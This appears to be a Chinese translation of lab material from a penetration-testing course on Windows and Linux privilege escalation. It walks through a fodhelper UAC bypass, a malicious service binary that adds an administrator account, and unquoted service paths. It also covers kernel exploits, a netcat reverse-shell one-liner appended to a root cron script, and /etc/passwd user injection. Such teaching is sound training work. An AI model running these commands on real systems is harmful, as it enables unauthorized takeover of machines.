![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442851064-a5b6b4a4-5ce4-46c8-a7b6-73a36f4546b7.png?x-oss-process=image%2Fresize%2Cw_1500)

上图显示，这次，fodhelper.exe文件尝试查询存储在新创建的命令键中的值（DelegateExecute）。在我们创建假应用程序协议密钥之前，这并没有发生。但是，由于我们不想通过COM对象劫持执行，所以我们将添加一个DelegateExecute项，使其值为空。我们希望当fodhelper发现这个空值时，它将遵循MSDN应用协议规范，并寻找Shell\Open\command\Default 中指定的程序来启动。

我们将使用 `REG ADD` 和 `/v` 参数指定值名称，并使用 `/t` 指定类型：

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```

为了验证fodhelper是否成功访问了我们刚刚添加的DelegateExecute条目，我们将删除“NAME NOT FOUND”过滤器并将其替换为“SUCCESS”，以仅显示成功的操作并重新启动进程：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606443074113-0625050b-5936-429e-8d35-f3d76ab4b3d0.png?x-oss-process=image%2Fresize%2Cw_1500)

正如预期的那样，fodhelper会找到我们添加的新DelegateExecute条目，但是由于它的值为空，它还会查找Shell\open\command注册表项的（默认）条目值。当添加任何注册表项时，默认条目值将自动创建为null。我们将遵循应用协议规范，用我们选择的可执行文件cmd.exe替换空（默认）值. 这将迫使fodhelper用我们自己的可执行文件来处理ms-settings:protocol。

为了测试这个理论，我们将设置新的注册表值。我们还将使用 `/d "cmd.exe"` “指定新的注册表值”和 `/f` 以静默方式添加值。

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

设定值并运行后fodhelper.exe文件我们再次看到一个命令行shell：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606443311444-172d7361-c9da-4209-a062-dfd98f199ae1.png)

`whoami /groups` 命令的输出表明这是一个高完整性的命令shell。接下来，我们将尝试更改管理员密码，看看是否可以成功绕过UAC：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606443359576-1d0554a8-b504-4adf-a35e-3c631d346421.png)

密码更改成功，我们已成功绕过UAC！

这次攻击不仅展示了一个很棒的UAC旁路，而且揭示了一个我们可以用来发现类似旁路的过程。

### 不安全的文件权限：serviio案例研究

> https://www.seebug.org/vuldb/ssvid-96964

如前所述，提升Windows系统上权限的一种常见方法是利用以nt authority\system运行的服务上不安全的文件权限。

例如，考虑一个场景，其中软件开发人员创建了一个作为Windows服务运行的程序。在安装过程中，开发人员不保护程序的权限，允许对Everyone组的所有成员进行完全的读写访问。因此，低权限用户可以用恶意程序替换该程序。当服务重新启动或计算机重新启动时，恶意文件将以系统权限执行。

在前面的一节中，我们展示了如何使用tasklist列出正在运行的服务。或者，我们可以将PowerShell `Get-WmiObject` cmdlet与win32服务WMI类一起使用。在本例中，我们将输出管道发送到 `Select-Object` 以显示我们感兴趣的字段，并使用 `Where-Object` 显示正在运行的服务（ `{$\.State -like 'running'}` ）：

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606443858380-a5abf66b-4691-416d-8cfb-ea12a3fc8fe1.png)

基于此输出，servio服务在Program Files目录中安装时非常突出。这意味着服务是用户安装的，软件开发人员负责目录结构以及软件的权限。这些情况使得它更容易出现这种类型的漏洞。

下一步，我们将使用 `icacls` windows实用程序枚举目标服务上的权限。这个实用程序将输出服务的安全标识符（或SIDs），然后输出一个权限掩码，后者在icacls文档中定义。下面列出了最相关的掩码和权限：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606443937249-fa00d5d8-6a92-4d35-a2f4-787643314673.png)

我们可以运行icacls，将完整的服务名作为参数传递。命令输出将枚举关联的权限：

`icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606443970668-8113b26f-db39-4306-be11-78e6495ad1c1.png)

ServiioService.exe可执行文件非常有趣。特别是，系统上的任何用户（BUILTIN\Users）都有对它的完全读写访问权限。这是一个严重的漏洞。

为了利用这种漏洞，我们可以使用我们自己的恶意二进制文件替换ServiioService.exe，然后通过重新启动服务或重新启动计算机来触发它。

我们将用一个例子来演示这种攻击。下面的C代码将创建一个名为“evil”的用户，并使用system函数将该用户添加到本地Administrators组。此代码的编译版本将用作我们的恶意二进制文件：

```
#include <stdlib.h>
int main ()
{ 
    int i;
    i = system ("net user evil Ev!lpass /add"); 
    i = system ("net localgroup administrators evil /add");
    return 0;
}
```

接下来，我们将使用i686-w64-mingw32-gcc交叉编译Kali机器上的代码，使用 `-o` 指定编译后的可执行文件的名称：

```
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

我们可以把带有恶意拷贝的二进制文件转移到我们的目标并替换原来的ServiioService.exe：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606444381072-4de58cf9-1d59-4f24-8566-ad159cb0791b.png)

为了执行二进制文件，我们可以尝试重新启动服务。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606444408903-57ba199c-0cb5-420e-86bb-8d0819b1e895.png)

不幸的是，我们似乎没有足够的特权来停止servio服务。这是预料之中的的，因为大多数服务由管理用户管理。

因为我们没有手动重新启动服务的权限，所以我们必须考虑另一种方法。如果服务设置为“自动”，我们可以通过重新启动机器。让我们在Windows Management Instrumentation Comma-line的帮助下检查servio服务的启动选项。

```
wmic service where caption="Serviio" get name, caption, state, startmode
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606444572592-cb1ceeb7-3efc-4461-885d-cadd3c2f1f6d.png)

此服务将在重新启动后自动启动。现在，让我们使用 `whoami` 命令来确定当前用户是否有权重新启动系统：

```
whoami /priv
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606444617745-c77d2d2f-1a07-44cc-a5e1-3c68748bfb09.png)

上面的清单显示，我们的用户已经被授予关闭权限（SeShutdownPrivilege）（以及其他权限），因此我们应该能够启动系统关闭或重新启动。注意，Disabled状态只指示当前是否为正在运行的进程启用了特权。在我们的例子中，这意味着whoami没有请求SeShutdownPrivilege特权，因此目前也没有使用SeShutdownPrivilege特权。

如果SeShutdownPrivilege不存在，我们将不得不等待受害者手动启动服务，这对我们来说就不太方便了。

让我们继续并在0秒后重新启动（/r）（/t 0）：

```
shutdown /r /t 0
```

现在重启已经完成，我们应该可以使用用户名“evil”，密码为“Ev!lpass”登录到目标机器。之后，我们可以使用 `net localgroup` 命令确认evil用户是本地管理员组的一部分。

```
net localgroup Administrators
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606444823988-9bfef68f-a436-4f59-bff2-74a9d3c12f29.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606444832499-7defc97f-e01a-4ea9-b7a4-c4154edfc009.png)

很不错的。我们使用不安全的文件权限将服务程序替换为我们自己的恶意二进制文件，该二进制文件在运行时授予我们对系统的管理访问权限。

### 利用未引用的服务路径

另一个有趣的攻击向量，可以导致Windows操作系统上的特权升级围绕非引用的服务路径。当我们对服务的主目录和子目录具有写入权限，但无法替换其中的文件时，我们可以使用此攻击。

正如我们在上一节中看到的，每个Windows服务都映射到一个可执行文件，该文件将在服务启动时运行。大多数情况下，与第三方软件一起提供的服务存储在C:\Program Files目录下，该目录的名称中包含空格字符。这可能会转化为权限提升攻击的机会。

当使用包含空格的文件或目录路径时，开发人员应始终确保它们用引号括起来。这确保它们被显式声明。但是，如果不是这样，并且路径名不加引号，则可以对其进行解释。具体地说，在可执行路径的情况下，每个空白字符后面的任何内容都将被视为可执行文件的潜在参数或选项。

例如，假设我们有一个服务存储在一个路径中，比如 `C:\Program Files\My Program\My Service\service.exe` . 如果服务路径未加引号地存储，每当Windows启动该服务时，它将尝试从以下路径运行可执行文件：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461226812-58cbde7f-b0c6-42b2-9f48-1972a9d515be.png)

在这个例子中，Windows将搜索每个“解释的位置”，试图找到一个有效的可执行路径。为了利用这个漏洞并破坏原始的未引用服务调用，我们必须创建一个恶意的可执行文件，将其放在与其中一个解释路径相对应的目录中，并对其进行命名，使其也与解释的文件名相匹配。然后，当服务运行时，它应该以与服务启动时相同的权限执行我们的文件。通常，这恰好是NT\SYSTEM帐户，这会导致成功的权限提升攻击。

例如，我们可以命名我们的Program.exe，把它放在C:\，或者命名它My.exe并将其放入C:\Program Files文件中。但是，这将需要一些不太可能的写入权限，因为标准用户在默认情况下没有对这些目录的写访问权限。

很可能是软件的主目录（在我们的示例中是C:\Program Files\My Program）或子目录（C:\Program Files\My Program\My service）配置错误，使我们能够植入恶意My.exe二进制文件。

虽然这种脆弱性需要特定的组合需求，但它很容易被开发，并且一个特权升级攻击向量值得考虑。

### Windows内核漏洞：USBPcap案例研究

例如在上一个fodhelper.exe文件，我们利用基于应用程序的漏洞绕过UAC。在本节中，我们将演示依赖于内核驱动程序漏洞的权限提升。

当试图利用系统级软件（如驱动程序或内核本身）时，我们必须仔细注意几个因素，包括目标的操作系统、版本和体系结构。如果无法准确识别这些因素，则会在运行攻击时触发死亡蓝屏（BSOD）。这可能会对客户的生产系统产生不利影响，并拒绝我们访问潜在的有价值的目标。

考虑到我们必须注意的级别，在下面的示例中，我们将首先确定目标操作系统的版本和体系结构。

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461572431-e25ddcb2-0908-4ed8-a087-873300670100.png)

命令的输出显示，我们的目标正在x86处理器上运行Windows7 SP1。

此时，我们可以尝试定位Windows 7 SP1 x86的本机内核漏洞，并使用它提升我们的权限。然而，第三方驱动程序漏洞利用更为常见。因此，在诉诸更困难的攻击之前，我们应该首先尝试调查这个攻击面。 

为此，我们将首先枚举系统上安装的驱动程序：

```
driverquery /v
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461638990-c335e8b0-b14f-423b-a94c-e4202431c7da.png)

输出主要包括典型的微软安装的驱动程序和数量非常有限的第三方驱动程序，如USBPcap。需要注意的是，即使这个驱动程序被标记为stopped，我们仍然可以与它交互，因为它仍然加载在内核内存空间中。

由于微软安装的驱动程序有一个相当严格的补丁周期，第三方驱动程序通常呈现出更诱人的攻击面。例如，让我们在漏洞数据库中搜索USBPcap：

```
searchsploit USBPcap
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461749317-cdd6aec4-0da0-4660-bd31-d229f8ecf6b4.png)

输出报告存在一个可用于USBPcap的攻击。如下图所示，该漏洞针对的是我们的操作系统版本、补丁级别和体系结构。但是，它取决于驱动程序的特定版本，即USBPcap版本1.1.0.0，它与Wireshark 2.2.5一起安装。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461809302-f7ba1d70-c4ba-4567-8003-471f30bc198c.png)

让我们看看我们的目标系统，看看是否安装了该驱动程序的特定版本。

首先，我们将列出Program Files目录的内容，以搜索USBPcap目录：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461853598-1934cfca-6d9d-4a2e-8d23-bb90e6d6ef47.png)

如我们所见，在C:\Program Files中有一个USBPcap目录。但是，请记住，驱动程序目录通常位于C:\Windows\System32\DRIVERS下。让我们检查一下USBPcap.inf文件要了解有关驱动程序版本的更多信息：

```
type USBPcap.inf
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606461914586-a265c52e-ccfe-470d-be3e-bc7091c37dbc.png)

根据版本信息，我们的驱动程序应该是易受攻击的。在我们试图利用它之前，我们首先必须编译这个漏洞，因为它是用C编写的。

#### 在Windows上编译C/C++代码

绝大多数针对内核级漏洞的攻击（包括我们选择的漏洞）都是用C或C++之类的低级编程语言编写的，因此需要编译。理想情况下，我们将在它打算运行的平台版本上编译代码。在这些情况下，我们只需创建一个与目标匹配的虚拟机并在那里编译代码。然而，我们也可以在一个完全不同于我们目标的操作系统上交叉编译代码。例如，我们可以在Kali系统上编译一个Windows二进制文件。

但是，对于这个模块，我们将使用Mingw-w64，它在Windows上为我们提供GCC编译器。

> sourceforge：https://sourceforge.net/projects/mingw-w64/files/mingw-w64/mingw-w64-release/
>
> 默认列出的是比较新的版本，一直往下滑，会有历史版本，如果希望自己实践的话，可以找一下和文中比较接近的i686的版本。

因为我们的Windows客户机预装了Mingw-w64，所以我们可以运行Mingw-w64.bat脚本，该脚本为gcc可执行文件设置PATH环境变量。一旦脚本完成，我们就可以执行gcc.exe文件确认一切正常：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606463210796-1a92c33d-1eb9-4195-a53b-afea6f1e2a08.png)

很好。编译器似乎在工作。现在，让我们将漏洞代码传输到我们的Windows客户端并尝试编译它。由于作者没有提到任何特定的编译选项，我们将尝试在不使用任何参数的情况下运行gcc，然后使用 `-o` 指定输出文件名：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606463246729-42ba4038-cae5-48a5-ad2d-ccad75d0f423.png?x-oss-process=image%2Fresize%2Cw_1500)

尽管有两条警告消息，漏洞编译成功，gcc创建了exploit.exe可执行文件。如果进程生成了错误消息，则编译将中止，我们将不得不尝试修复漏洞代码并重新编译它。

现在我们已经编译了漏洞攻击，我们可以将其传输到目标计算机并尝试运行它。为了确定我们的权限提升是否成功，我们可以在运行漏洞攻击之前和之后使用 `whoami` 命令：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606463353826-af4f8cd5-c5d4-4757-8a64-e58698e25fa1.png?x-oss-process=image%2Fresize%2Cw_1500)

太好了！我们已成功地将权限从管理pc\n00b提升到nt authority\system，是具有最高权限级别的Windows帐户。

## Linux权限提升示例

### 了解Linux权限

在讨论权限提升技术之前，让我们花点时间简要讨论一下Linux特权、访问控制和用户。

Linux和其他UNIX衍生物的一个定义特性是，大多数资源（包括文件、目录、设备，甚至网络通信）都在文件系统中表示。

通俗地说，“一切都是一个文件”。每个文件（扩展到Linux系统的每个元素）都遵循基于三个主要能力的用户和组权限：读、写和执行。

### 不安全的文件权限：Cron案例研究

当我们将注意力转向权限提升技术时，我们将首先利用不安全的文件权限。与我们的Windows示例一样，我们假设我们已经以非特权用户的身份访问了Linux目标机器。

为了利用不安全的文件权限，我们必须找到一个可执行文件，该文件不仅允许我们进行写访问，而且可以在提升的权限级别上运行。在Linux系统上，cron基于时间的作业调度器是主要目标，因为系统级调度作业是以root用户权限执行的，而系统管理员通常为cron作业创建脚本，而权限不安全。

在本例中，我们将SSH连接到我们的专用Debian客户机。在前面的文件系统中，我们显示了在目标系统上安装的作业。我们还可以检查cron日志文件（/var/log/cron.log日志)对于运行cron作业：

```
grep "CRON" /var/log/cron.log
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606464187573-17327a49-c3a5-4882-8454-35a7e288829a.png)

似乎一个/var/scripts/下名为user_backups.sh的脚本在根用户的上下文中执行。从时间戳来看，这个作业似乎每五分钟运行一次。

我们可以检查脚本的位置和权限。

```
cat /var/scripts/user_backups.sh
ls -lah /var/scripts/user_backups.sh
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606464425594-fd55c757-fd52-4f58-9a6c-64e90e1fcb36.png)

由于非特权用户可以修改备份脚本的内容，所以我们可以编辑它并添加一个反向shell一行程序。如果我们的计划成功了，我们应该在最多五分钟的时间后，在我们的攻击机器上收到一个root级别的反向shell。

```
echo >> user_backup.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606464569392-a301c670-b2f5-4da7-bbd4-a544bb2b0ecd.png)

我们现在要做的就是在Kali Linux机器上设置一个侦听器，然后等待cron作业执行：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606465447478-d582a721-d6b1-40f9-928e-d88e5eb6b0ef.png)

如上图所示，cron作业确实执行了，与一行反向shell一样。我们已经成功提升了对目标的访问权限。

虽然这只是个简单的例子，我们在这个领域遇到过一些类似的情况，因为管理员通常更关注于争论cron的奇怪语法，而不是保护脚本文件权限。

### 不安全的文件权限：/etc/passwd案例研究

除非使用像active directory或LDAP这样的集中式凭证系统，否则Linux密码通常存储在/etc/shadow中，这是普通用户无法读取的。然而，从历史上看，密码哈希和其他帐户信息都存储在世界可读文件/etc/passwd中。为了向后兼容，如果密码散列出现在/etc/passwd用户记录的第二列中，则认为该哈希对身份验证有效，并且优先于/etc/shadow中的相应条目（如果可用）。这意味着，如果我们可以写入/etc/passwd文件，就可以有效地为任何帐户设置任意密码。

让我们来演示一下。在上一节中，我们展示了由于/etc/passwd权限设置不正确，Debian客户机可能容易受到权限提升的影响。为了提升我们的权限，我们将在/etc/passwd文件中添加另一个超级用户（root2）和相应的密码散列。我们将首先在openssl和passwd参数的帮助下生成密码散列。默认情况下，如果没有指定其他选项，openssl将使用crypt算法生成哈希，它是Linux身份验证支持的哈希机制。生成哈希后，我们将使用适当的格式在/etc/passwd中添加一行：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606465826367-b1587e8a-de91-4164-aeaf-3ad476908a0c.png)

如图所示，/etc/passwd记录中的“root2”用户和密码散列后跟用户id（UID）0和组id（GID）0。这些零值指定我们创建的帐户是Linux上的超级用户帐户。最后，为了验证我们的修改是有效的，我们使用su命令将我们的标准用户切换到新创建的root2帐户，并发出id命令来显示我们确实拥有root权限。

### 核心漏洞：CVE-2017-1000112案例研究

内核攻击是提升权限的一个很好的方法，但是成功与否不仅取决于目标的内核版本，还取决于操作系统的风格，包括Debian、Redhat、Gentoo等。

为了演示这个攻击向量，我们首先通过检查 `/etc/issue` 文件来收集关于目标的信息。正如本模块前面所讨论的，这是一个系统文本文件，其中包含要在Linux机器上的登录提示之前打印的消息或系统标识。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606466992037-be5c5928-bc69-4bde-a6e3-4f79c5bdaca4.png)

接下来，我们将使用标准系统命令检查内核版本和系统架构：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606467010143-7eb5ae83-ae97-477b-be02-2a8514e6de6a.png)

我们的目标系统似乎在运行Ubuntu16.04.3LTS（kernel 4.8.0-58-generic），运行在x86_64架构上。有了这些信息，我们可以在本地Kali系统上使用 `searchsploit` 来查找与目标版本匹配的内核漏洞。

```
searchsploit linux ubuntu 16.04
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606467073838-2dfcd5c3-da4a-4d0a-b086-14cc66b39042.png)

最后一个利用（exploits/linux/local/43418.c）似乎直接对应于目标运行的内核版本。我们将尝试通过在目标上运行此攻击来提升我们的权限。

#### 在Linux上编译C/C++代码

我们将在Linux上使用gcc来编译我们的漏洞。请记住，在编译代码时，我们必须匹配目标的体系结构。在目标机器没有编译器的情况下，这一点尤其重要，我们被迫在攻击机器或复制目标操作系统和体系结构的沙盒环境中编译漏洞。

在这个例子中，我们很幸运目标机器有一个可以工作的编译器，但这在这个领域中很少见。

让我们将漏洞利用文件复制到目标并编译它，只传递源代码文件和 `-o` 以指定输出文件名（exploit）：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606467187011-df7479b4-f6ea-4d20-8f08-08634eea6975.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606467194114-ad5d0901-147a-4886-aa43-d7482f672151.png)

在我们的目标机器上编译漏洞利用后，我们可以运行它并使用 `whoami` 检查我的权限等级：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606467283313-e4466bf5-e318-4332-939e-2a54abea52b8.png)

上图显示，我们的权限已成功地从n00b（标准用户）提升到root，这是Linux操作系统上的最高权限帐户。